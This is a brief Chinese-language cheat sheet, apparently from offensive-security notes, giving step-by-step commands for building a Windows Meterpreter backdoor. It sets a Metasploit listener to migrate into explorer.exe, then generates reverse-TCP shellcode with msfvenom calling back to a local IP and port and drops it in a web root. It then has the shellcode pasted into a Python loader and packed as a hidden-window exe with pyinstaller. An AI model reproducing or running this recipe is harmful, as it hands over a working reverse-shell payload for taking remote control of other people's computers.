	生成C格式payload
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
	粘贴shellcode到shellcode+c.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe
	>python pyinstaller-script.py -F -w shellcode.py
	会在目录下生成dist文件夹，exe文件就在里面